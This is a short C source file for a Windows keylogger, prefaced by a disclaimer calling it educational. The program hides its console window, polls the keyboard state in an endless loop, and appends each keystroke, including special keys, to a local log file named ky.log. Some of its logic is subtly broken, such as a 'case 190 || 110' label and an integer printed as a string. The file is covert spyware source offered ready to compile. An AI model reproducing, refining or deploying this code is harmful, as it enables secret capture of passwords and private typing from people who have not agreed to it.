/*I am not responsible for any damage done by this keylogger, this programm is for educational purposes ONLY
  DONT USE IT WITHOUT PERMISSION */

#include <stdio.h>
#include <windows.h>

void stealth();
int save(int key, char *filename);

void stealth() {      //stealth function to hide the console and run in background
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int key, char *filename) {                          //save function that saves the keystroke into a file
    if ((key == 1) || (key == 2)) return 0;
    FILE * fileptr;
    fileptr = fopen(filename, "a+");

    switch (key) {                                              //check if the key pressed was one of these special keys 
        case 8: fprintf(fileptr, "{BACKSPACE}"); break;
        case 13: fprintf(fileptr, "{ENTER}"); break;
        case 32: fprintf(fileptr, " "); break;
        case VK_TAB: fprintf(fileptr, "{TAB}"); break;
        case VK_SHIFT: fprintf(fileptr, "{SHIFT}"); break;
        case VK_CONTROL: fprintf(fileptr, "{CONTROL}"); break;
        case VK_ESCAPE: fprintf(fileptr, "{ESCAPE}"); break;
        case VK_END: fprintf(fileptr, "{END}"); break;
        case VK_HOME: fprintf(fileptr, "{HOME}"); break;
        case VK_LEFT: fprintf(fileptr, "{LEFT}"); break;
        case VK_UP: fprintf(fileptr, "{UP}"); break;
        case VK_RIGHT: fprintf(fileptr, "{RIGHT}"); break;
        case VK_DOWN: fprintf(fileptr, "{DOWN}"); break;
        case 190 || 110: fprintf(fileptr, "."); break;
        default: fprintf(fileptr, "%s", &key); break;
    }
    fclose(fileptr);
    return 0;
}

int main() {
    stealth();                     //calls the function to hide the console
    char c;

    while (1) {
        Sleep(10);
        for (int c = 0; c < 191; c++) {                //go through all the virtual keycodes to check if one of them was pressed
            if (GetAsyncKeyState(c) == -32767)        
                save(c, "ky.log");                    //name of the created file
        }
    }
    return 0;
}
